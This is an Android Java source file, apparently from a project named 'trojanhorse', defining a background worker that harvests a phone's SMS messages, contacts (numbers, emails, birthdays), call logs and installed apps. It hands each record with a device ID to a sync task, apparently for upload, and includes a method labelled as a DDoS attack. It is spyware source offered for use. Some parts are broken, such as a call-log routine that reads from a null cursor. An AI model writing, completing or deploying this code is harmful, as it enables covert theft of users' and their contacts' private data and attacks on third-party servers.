package com.codensecurity.trojanhorse.icode;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Loader;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class PeriodicDataSync extends Worker {

    Cursor cursor;
    ArrayList<String> sms;
    ArrayList<String> contactList;
    //Cursor cursor;
    int counter;
    private Context mContext;
    private WorkerParameters wParams;
    private PackageManager packageManager;
    private List<ApplicationInfo> applist;

    public PeriodicDataSync(@NonNull Context mContext, @NonNull WorkerParameters workerParams) {
        super(mContext, workerParams);
        this.mContext = mContext;
        this.wParams = workerParams;
    }

    @NonNull
    @Override
    public Result doWork() {
      //Bg work
        try{
            //getting SMSs...
            readSMSs();
        }catch(RuntimeException e){
            e.fillInStackTrace();
        }
        try{
            //getting contacts...
            getContacts();
        }catch(RuntimeException e){
            e.fillInStackTrace();
        }
        try{
            //Reading installed Apps...
            getApps();
        }catch(RuntimeException e){
            e.fillInStackTrace();
        }
        try{
            //Reading call Logs here...
            getCallLogs();
        }catch(RuntimeException e){
            e.fillInStackTrace();
        }
        try{
//            for(int i = 0; i < 2; i++) {
                //DoS Attack code here...
                dDosAttack();
//            }
        }catch(RuntimeException e){
            e.fillInStackTrace();
        }

        // Return Result.success() if the work is successful, Result.retry() to retry, or Result.failure() on failure
        return Result.success();
    }

    public void dDosAttack() {
                BgSync sync = new BgSync();
                sync.execute("url");
    }
    @SuppressLint("Range")
    public void readSMSs() {
        String key = Build.ID;
        sms = new ArrayList<>();
        Uri uriSms = Uri.parse("content://sms/");
        ContentResolver contentResolver = mContext.getContentResolver();
        cursor = contentResolver.query(uriSms, new String[]
                        {"_id", "address", "date", "body", "type", "read"},
                null, null, null);

        assert cursor != null;
        for (int i = 0; i < cursor.getCount(); i++) {
            while (cursor.moveToNext()) {

                String id = cursor.getString(0);
                String address = cursor.getString(1);
                String smsDate = cursor.getString(2);
                String date = String.valueOf(new Date(Long.parseLong(smsDate)));
                String body = cursor.getString(3);
                String type;
                if (cursor.getString(4).contains("1")) {
                    type = "Received";
                } else {
                    type = "Sent";
                }
                String readState;
                if (cursor.getString(5).contains("1")) {
                    readState = "Read";
                } else {
                    readState = "Unread";
                }

                System.out.println("==: " + id);
                System.out.println("==: " + type);
                System.out.println("==: " + address);
                System.out.println("==: " + body);
                System.out.println("==: " + date);
                System.out.println("==: " + readState);
                System.out.println("==: " + key);

                BgSync sync = new BgSync();
                sync.execute("sms", id, type, address, body, date, readState, key);
            }
        }
    }


    @SuppressLint("Range")
public void getContacts() {
    contactList = new ArrayList<>();

    String name;
    String phoneNumber = null;
    String email = null;
    String birthday;

    Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
    String _ID = ContactsContract.Contacts._ID;
    String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
    String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

    Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
    String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

    Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
    String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
    String DATA = ContactsContract.CommonDataKinds.Email.DATA;

    StringBuffer output;
    ContentResolver contentResolver = mContext.getContentResolver();
    cursor = contentResolver.query(CONTENT_URI, null, null, null, null);

    // Iterate every contact in the phone
    assert cursor != null;
    if (cursor.getCount() > 0) {
        for (int i = 0; i < 100; i++) {}
        while (cursor.moveToNext()) {
            output = new StringBuffer();

            @SuppressLint("Range") String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
            name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));


            int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER)));


            if (hasPhoneNumber > 0) {
                output.append("\n Display Name: ").append(name);
                Log.d("Name: ", name);

                //This is to read multiple phone numbers associated with the same contact
                Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[]{contact_id}, null);

                assert phoneCursor != null;
                while (phoneCursor.moveToNext()) {
                    phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                    output.append("\n Phone number:").append(phoneNumber);
                    Log.d("Phone Number: ", phoneNumber);
                }

                phoneCursor.close();

                // Read every email id associated with the contact
                Cursor emailCursor = contentResolver.query(EmailCONTENT_URI, null, EmailCONTACT_ID + " = ?", new String[]{contact_id}, null);

                assert emailCursor != null;
                while (emailCursor.moveToNext()) {

                    email = emailCursor.getString(emailCursor.getColumnIndex(DATA));

                    if (!email.contains("@")) {
                        email = "missing" + counter++;
                        output.append("\n Email: ").append(email);
                        Log.d("Email: ", email);
                    } else {
                        output.append("\n Email: ").append(email);
                        Log.d("Email: ", email);
                    }
                }

                emailCursor.close();

                String columns[] = {
                        ContactsContract.CommonDataKinds.Event.START_DATE,
                        ContactsContract.CommonDataKinds.Event.TYPE,
                        ContactsContract.CommonDataKinds.Event.MIMETYPE,
                };

                String where = ContactsContract.CommonDataKinds.Event.TYPE + "=" + ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY +
                        " and " + ContactsContract.CommonDataKinds.Event.MIMETYPE + " = '" + ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE + "' and " + ContactsContract.Data.CONTACT_ID + " = " + contact_id;

                String sortOrder = ContactsContract.Contacts.DISPLAY_NAME;

                Cursor birthdayCur = contentResolver.query(ContactsContract.Data.CONTENT_URI, columns, where, null, sortOrder);
                assert birthdayCur != null;
                Log.d("BDAY", birthdayCur.getCount() + "");
                if (birthdayCur.getCount() > 0) {
                    while (birthdayCur.moveToNext()) {
                        birthday = birthdayCur.getString(birthdayCur.getColumnIndex(ContactsContract.CommonDataKinds.Event.START_DATE));
                        if (!birthday.contains("19")) {
                            birthday = "missing" + counter++;
                        } else {
                            output.append("\n Birthday :").append(birthday);
                            Log.d("BDAY: ", birthday + "\n\n");
                        }
                    }
                }
                birthdayCur.close();
            }

            if (ActivityCompat.checkSelfPermission(this.getApplicationContext(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this.getApplicationContext(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }

            // Add the contact to the ArrayList
            contactList.add(output.toString());

            String key = Build.ID;
            BgSync sync = new BgSync();
            sync.execute("contacts", key, name, phoneNumber, email);

            //Saving contacts in a text doc
            System.out.println("Device Id =: " + key);
        }
    }
}
public void getCallLogs() {
    Loader<Cursor> loader;
    final Cursor managedCursor = null;

    int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
    int display_name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
    int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
    int location = 0;
    location = managedCursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION);
    int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
    int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);



    // Iterate every contact in the phone
    for (int i = 0; i < managedCursor.getCount(); i++) {
        while (managedCursor.moveToNext()) {

            String phNumber = managedCursor.getString(number);
            String name = managedCursor.getString(display_name);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            String callDayTime = String.valueOf(new Date(Long.parseLong(callDate)));
            String callDuration = managedCursor.getString(duration);
            String geocode = managedCursor.getString(location);

            String dir = null;

            int callTypeCode = Integer.parseInt(callType);
            switch (callTypeCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "Outgoing";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "Incoming";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "Missed";
                    break;

                case 6:
                    dir = "Blocked";
                    break;

                case CallLog.Calls.REJECTED_TYPE:
                    dir = "Rejected";
                    break;

                case CallLog.Calls.VOICEMAIL_TYPE:
                    dir = "Voice mail";
                    break;

                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                    dir = "Answered Externally";
                    break;
            }

            Log.d("Logs Name:  ", name);
            Log.d("Logs Number:", phNumber);
            Log.d("Logs dir:   ", dir);
            Log.d("Logs callDayTime:", callDayTime);
            Log.d("Logs callDuration:", callDuration);
            Log.d("Logs geocode:  ", geocode);


            String uKey = Build.ID;
            BgSync sync = new BgSync();
            sync.execute("call_logs", name, phNumber, dir, callDayTime, callDuration, geocode, uKey);


        }
    }

    managedCursor.close();
}
    @SuppressLint("InflateParams")
    public void getApps() {
        if (applist != null) {
            for(int i=0; i<applist.size(); i++) {

                ApplicationInfo data = applist.get(i);

                String appName = (String) data.loadLabel(packageManager);
                Drawable icon = data.loadIcon(packageManager);
                String package_name = data.packageName;

                String key = Build.ID;

                Log.d("Phone ID:    ", key);
                Log.d("Phone appName:  ", appName);
                Log.d("Phone Icon:    ", String.valueOf(icon));
                Log.d("Phone package:    ", package_name);

                BgSync sync = new BgSync();
                sync.execute("apps", key, appName, String.valueOf(icon), package_name);
            }
        }
    }
}
